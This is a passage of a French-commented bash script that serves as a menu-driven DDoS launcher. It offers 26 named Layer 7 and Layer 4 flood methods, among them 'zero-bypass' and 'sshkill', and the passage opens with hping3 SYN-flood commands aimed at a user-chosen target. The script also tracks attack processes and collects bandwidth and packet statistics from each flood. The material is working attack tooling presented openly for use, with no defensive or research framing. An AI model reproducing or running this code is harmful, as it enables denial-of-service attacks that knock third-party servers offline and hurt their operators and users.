            launch_hping "timeout $DURATION hping3 -S -p 22 -i u500 $TARGET"
            ;;
        *)
            launch_hping "timeout $DURATION hping3 -S -p $PORT -i u1000 $TARGET"
            ;;
    esac
    wait
else
    echo "hping3 not found, install it first: apt install hping3"
    exit 1
fi

echo "[$METHOD] Attack completed"
SCRIPT_EOF
    
    sed -i "s/METHOD_NAME/$method/g" "/opt/discord.cool/attacks/l4_${method}.sh"
    chmod +x "/opt/discord.cool/attacks/l4_${method}.sh"
}

# Fonction pour installer dstat si nécessaire
install_dstat() {
    if ! command -v dstat &> /dev/null; then
        echo -e "${YELLOW}Installing dstat for monitoring...${NC}"
        apt-get update -qq > /dev/null 2>&1
        apt-get install -y dstat > /dev/null 2>&1
    fi
}

# Fonction pour lancer dstat monitoring
start_dstat_monitoring() {
    local method=$1
    local duration=$2
    local log_file="/tmp/dstat_${method}.log"
    
    install_dstat
    
    if command -v dstat &> /dev/null; then
        echo -e "${CYAN}Starting dstat monitoring (packets, bandwidth, CPU, MEM)...${NC}"
        dstat -cdngy --net-packets --output "$log_file" 1 > /dev/null 2>&1 &
        echo $! > "/tmp/dstat_${method}.pid"
        
        # Afficher les stats en temps réel dans un autre terminal ou fichier
        (sleep 2 && while [ -f "/tmp/dstat_${method}.pid" ]; do
            if [ -f "$log_file" ]; then
                tail -n 1 "$log_file" 2>/dev/null | awk -F',' '{printf "\r[STATS] CPU: %s%% | MEM: %s%% | NET RX: %s | NET TX: %s | PACKETS RX: %s | PACKETS TX: %s", $1, $2, $3, $4, $5, $6}'
            fi
            sleep 1
        done) &
    fi
}

# Fonction pour arrêter dstat
stop_dstat_monitoring() {
    local method=$1
    local pid_file="/tmp/dstat_${method}.pid"
    
    if [ -f "$pid_file" ]; then
        local pid=$(cat "$pid_file")
        kill "$pid" 2>/dev/null
        rm -f "$pid_file"
    fi
    pkill -f "dstat.*${method}" 2>/dev/null
}

# Fonction pour afficher les stats dstat
show_dstat_stats() {
    local method=$1
    local log_file="/tmp/dstat_${method}.log"
    
    if [ -f "$log_file" ] && [ -s "$log_file" ]; then
        echo -e "${CYAN}╔══════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║${NC} ${BOLD}Attack Statistics (dstat)${NC}                                            ${CYAN}║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════════════════════════════╝${NC}"
        echo ""
        
        # Calculer les moyennes et totaux
        awk -F',' 'NR>2 {
            cpu+=$1; mem+=$2; net_rx+=$3; net_tx+=$4; pkt_rx+=$5; pkt_tx+=$6; count++
        } END {
            if (count > 0) {
                printf "Average CPU: %.1f%%\n", cpu/count
                printf "Average MEM: %.1f%%\n", mem/count
                printf "Total Network RX: %.2f MB\n", net_rx/1024/1024
                printf "Total Network TX: %.2f MB\n", net_tx/1024/1024
                printf "Total Packets RX: %.0f\n", pkt_rx
                printf "Total Packets TX: %.0f\n", pkt_tx
            }
        }' "$log_file" 2>/dev/null
        
        echo ""
        echo -e "${YELLOW}Last 10 entries:${NC}"
        tail -n 10 "$log_file" | column -t -s',' 2>/dev/null || tail -n 10 "$log_file"
    else
        echo -e "${YELLOW}No statistics available yet${NC}"
    fi
}

# Fonction pour lancer une attaque L7
launch_l7_attack() {
    local method=$1
    local script_path="/opt/discord.cool/attacks/l7_${method}.sh"
    
    if [ ! -f "$script_path" ]; then
        echo -e "${YELLOW}Creating optimized script for ${method}...${NC}"
        create_l7_script "$method"
    fi
    
    echo -e "${GREEN}Launching ${method} attack...${NC}"
    
    # Démarrer le monitoring dstat
    start_dstat_monitoring "$method" "$DURATION"
    
    # Lancer l'attaque
    bash "$script_path" "$TARGET" "$PORT" "$DURATION" "$THREADS" "$OPTIONS" &
    local attack_pid=$!
    echo $attack_pid > "/tmp/emyno_${method}.pid"
    
    echo -e "${GREEN}Attack started! PID: $attack_pid${NC}"
    echo -e "${CYAN}Monitoring active. Stats will be available after attack.${NC}"
    
    # Attendre la fin de l'attaque et afficher les stats
    (wait $attack_pid 2>/dev/null; sleep 2; stop_dstat_monitoring "$method"; show_dstat_stats "$method") &
}

# Fonction pour lancer une attaque L4
launch_l4_attack() {
    local method=$1
    local script_path="/opt/discord.cool/attacks/l4_${method}.sh"
    
    if [ ! -f "$script_path" ]; then
        echo -e "${YELLOW}Creating optimized script for ${method}...${NC}"
        create_l4_script "$method"
    fi
    
    echo -e "${GREEN}Launching ${method} attack...${NC}"
    
    # Démarrer le monitoring dstat
    start_dstat_monitoring "$method" "$DURATION"
    
    # Lancer l'attaque
    bash "$script_path" "$TARGET" "$PORT" "$DURATION" "$THREADS" "$OPTIONS" &
    local attack_pid=$!
    echo $attack_pid > "/tmp/emyno_${method}.pid"
    
    echo -e "${GREEN}Attack started! PID: $attack_pid${NC}"
    echo -e "${CYAN}Monitoring active. Stats will be available after attack.${NC}"
    
    # Attendre la fin de l'attaque et afficher les stats
    (wait $attack_pid 2>/dev/null; sleep 2; stop_dstat_monitoring "$method"; show_dstat_stats "$method") &
}

# Fonction pour voir les attaques actives
view_active_attacks() {
    clear
    show_header
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${NC} ${BOLD}Active Attacks${NC}                                                         ${CYAN}║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    local found=false
    for pidfile in /tmp/emyno_*.pid; do
        if [ -f "$pidfile" ]; then
            local pid=$(cat "$pidfile")
            local method=$(basename "$pidfile" | sed 's/emyno_//;s/.pid//')
            if ps -p "$pid" > /dev/null 2>&1; then
                found=true
                local runtime=$(ps -o etime= -p "$pid" 2>/dev/null | tr -d ' ')
                echo -e "${GREEN}[ACTIVE]${NC} Method: ${YELLOW}$method${NC} | PID: $pid | Runtime: $runtime"
            else
                rm -f "$pidfile"
            fi
        fi
    done
    
    if [ "$found" = false ]; then
        echo -e "${YELLOW}No active attacks${NC}"
    fi
    
    echo ""
    read -p "Press Enter to continue..."
}

# Fonction pour arrêter toutes les attaques
stop_all_attacks() {
    echo -e "${RED}Stopping all attacks...${NC}"
    for pidfile in /tmp/emyno_*.pid; do
        if [ -f "$pidfile" ]; then
            local pid=$(cat "$pidfile")
            if ps -p "$pid" > /dev/null 2>&1; then
                kill "$pid" 2>/dev/null && echo -e "${GREEN}Stopped PID: $pid${NC}"
            fi
            rm -f "$pidfile"
        fi
    done
    pkill -f "l7_.*\.sh" 2>/dev/null
    pkill -f "l4_.*\.sh" 2>/dev/null
    pkill -f "curl.*$TARGET" 2>/dev/null || true
    echo -e "${GREEN}All attacks stopped${NC}"
    sleep 2
}

# Fonction pour tester la connexion
test_connection() {
    read -p "$(echo -e ${YELLOW}Target to test:${NC} ) " test_target
    echo -e "${CYAN}Testing connection to $test_target...${NC}"
    
    if timeout 5 curl -s -k -m 3 "https://$test_target" > /dev/null 2>&1; then
        echo -e "${GREEN}✓ HTTPS connection successful${NC}"
    elif timeout 5 curl -s -m 3 "http://$test_target" > /dev/null 2>&1; then
        echo -e "${GREEN}✓ HTTP connection successful${NC}"
    else
        echo -e "${RED}✗ Connection failed${NC}"
    fi
    
    read -p "Press Enter to continue..."
}

# Main loop
main() {
    while true; do
        show_header
        show_menu
        echo ""
        read -p "$(echo -e ${BOLD}${GREEN}Select option:${NC} ) " choice
        
        case $choice in
            1) get_attack_params "browser" && launch_l7_attack "browser" ;;
            2) get_attack_params "browser-vip" && launch_l7_attack "browser-vip" ;;
            3) get_attack_params "h2-zero" && launch_l7_attack "h2-zero" ;;
            4) get_attack_params "h2-zerov2" && launch_l7_attack "h2-zerov2" ;;
            5) get_attack_params "rapid-zero" && launch_l7_attack "rapid-zero" ;;
            6) get_attack_params "rapid-zero-priv" && launch_l7_attack "rapid-zero-priv" ;;
            7) get_attack_params "h2-raw" && launch_l7_attack "h2-raw" ;;
            8) get_attack_params "h2-rawgeo" && launch_l7_attack "h2-rawgeo" ;;
            9) get_attack_params "h2f" && launch_l7_attack "h2f" ;;
            10) get_attack_params "h2f-priv" && launch_l7_attack "h2f-priv" ;;
            11) get_attack_params "http-free" && launch_l7_attack "http-free" ;;
            12) get_attack_params "http-raw" && launch_l7_attack "http-raw" ;;
            13) get_attack_params "http-raw-priv" && launch_l7_attack "http-raw-priv" ;;
            14) get_attack_params "zero" && launch_l7_attack "zero" ;;
            15) get_attack_params "zero-bypass" && launch_l7_attack "zero-bypass" ;;
            16) get_attack_params "zero-rst" && launch_l7_attack "zero-rst" ;;
            17) get_attack_params "zero-rstgeo" && launch_l7_attack "zero-rstgeo" ;;
            18) get_attack_params "zerov2" && launch_l7_attack "zerov2" ;;
            19) get_attack_params "vhold" && launch_l7_attack "vhold" ;;
            20) get_attack_params "vholdv2" && launch_l7_attack "vholdv2" ;;
            21) get_attack_params "tcp" && launch_l4_attack "tcp" ;;
            22) get_attack_params "tcp-bot" && launch_l4_attack "tcp-bot" ;;
            23) get_attack_params "tcp-pshack" && launch_l4_attack "tcp-pshack" ;;
            24) get_attack_params "tcprand" && launch_l4_attack "tcprand" ;;
            25) get_attack_params "sshkill" && launch_l4_attack "sshkill" ;;
            26) get_attack_params "sshkill-bot" && launch_l4_attack "sshkill-bot" ;;
            99) view_active_attacks ;;
            98) stop_all_attacks ;;
            97) test_connection ;;
            96) system_monitoring ;;
            95) bandwidth_test ;;
            94) network_statistics ;;
            93) latency_test ;;
            92) view_attack_stats ;;
            91) process_monitor ;;
            90) network_interface_info ;;
            0) 
                stop_all_attacks
                echo -e "${GREEN}Goodbye!${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}Invalid option!${NC}"
                sleep 1
                ;;
        esac
        
        if [ $? -eq 0 ] && [ "$choice" -ge 1 ] && [ "$choice" -le 26 ]; then
            echo ""
            read -p "$(echo -e ${YELLOW}Press Enter to continue...${NC})"
        fi
    done
}

# Run main
main

